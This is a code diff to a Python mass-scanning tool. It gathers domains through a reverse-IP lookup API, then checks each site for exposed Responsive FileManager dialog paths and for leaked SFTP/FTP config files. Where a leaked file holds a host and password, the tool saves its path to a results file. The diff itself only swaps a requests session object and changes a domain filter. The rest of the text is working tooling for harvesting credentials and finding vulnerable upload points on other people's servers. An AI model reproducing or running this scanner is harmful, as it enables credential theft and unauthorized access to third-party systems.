@@ -150,8 +150,8 @@ class Grabber:
 							print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
 							sleep(0.01)
 						self.count += 1
-						#if self.domain in y:
-						open(save, "a+").write(y.strip()+"\n")
+						if self.domain in y:
+							open(save, "a+").write(y.strip()+"\n")
 				except:
 					break
 	def Running(self):
@@ -163,7 +163,7 @@ class Grabber:
 		with pol(max_workers=10) as sub:
 			for cd in range(25):
 				sub.submit(self.Builw, cd)
-		self.xplore()
+		#self.xplore()
 
 def reverseIP(domain, model, domen):
 	app = []
@@ -257,10 +257,9 @@ def checkerWP(domain):
 
 def checkerRFM(domain):
 	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
-	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
+	cok = r.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
 	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
 	if len(fetch) == 0:fetch.append(domen)
-
 	DIR = ['/assets/filemanager/', '/assets/file-manager/',
 		'/assets/filemanagers/', '/assets/filemanager/dialog.php',
 		'/asset/filemanager/dialog.php', '/asset/filemanager/',
@@ -294,11 +293,9 @@ def checkerRFM(domain):
 
 def checkerFTP(domain):
 	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
-	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
+	cok = r.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
 	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
 	if len(fetch) == 0:fetch.append(domen)
-
-	#--> minimalize <----
 	DIR = [
 		"/sftp-config.json",
 		"/ftp-config.json",
@@ -321,7 +318,7 @@ def checkerFTP(domain):
 		for tuhan in DIR:
 			try:
 				path = url + tuhan
-				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).json()
+				cek = r.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).json()
 				if len(cek["host"]) != 0 and len(cek["password"]) != 0:
 					writer("results/sftp.txt", path)
 					print("   +> "+path)
